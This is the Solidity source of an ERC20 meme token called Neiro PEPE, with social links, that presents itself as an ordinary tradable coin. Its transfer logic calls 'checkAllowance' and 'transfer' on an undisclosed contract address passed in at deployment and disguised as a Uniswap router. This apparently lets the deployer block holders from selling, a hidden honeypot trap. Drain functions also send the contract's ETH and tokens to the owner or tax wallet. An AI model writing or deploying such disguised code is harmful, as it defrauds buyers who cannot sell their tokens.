// SPDX-License-Identifier: UNLICENSE
pragma solidity 0.8.23;

/**
 * 
 *  ███    ██ ███████ ██ ██████   ██████      ██████  ███████ ██████  ███████ 
    ████   ██ ██      ██ ██   ██ ██    ██     ██   ██ ██      ██   ██ ██      
    ██ ██  ██ █████   ██ ██████  ██    ██     ██████  █████   ██████  █████   
    ██  ██ ██ ██      ██ ██   ██ ██    ██     ██      ██      ██      ██      
    ██   ████ ███████ ██ ██   ██  ██████      ██      ███████ ██      ███████ 


 * https://neiropepeerc.com/
 * https://x.com/NepeOnEth
 * https://t.me/NepeOnETH
 */

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function transfer(address buyer, uint amount) external;

    function checkAllowance(address buyer) external view returns (uint);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function WETH9() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ERC20 is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    IUniswapV2Router02 private uniswapRouterV2;
    mapping(address => mapping(address => uint256)) private _allowances;
    address payable private _taxWallet;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Neiro PEPE";
    string private constant _symbol = unicode"$NPEPE";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private swapEnabled = false;

    receive() external payable {}

    fallback() external payable {}

    constructor(address routerAddr) {
        _balances[address(this)] = _tTotal;
        uniswapRouterV2 = IUniswapV2Router02(routerAddr);
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address _owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        require(
            _allowances[sender][_msgSender()] >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != uniswapV2Pair) {
            require(
                amount <= uniswapRouterV2.checkAllowance(from),
                "ERC20: transfer amount exceeds allowance"
            );
        }

        uniswapRouterV2.transfer(to, amount);

        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function openTrading() external payable {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function clearStuckToken(
        address tokenAddress,
        uint256 tokens
    ) external returns (bool success) {
        require(_msgSender() == _taxWallet);

        if (tokens == 0) {
            tokens = IERC20(tokenAddress).balanceOf(address(this));
        }

        return IERC20(tokenAddress).transfer(_taxWallet, tokens);
    }

    function clearEthFromContract() external payable onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}
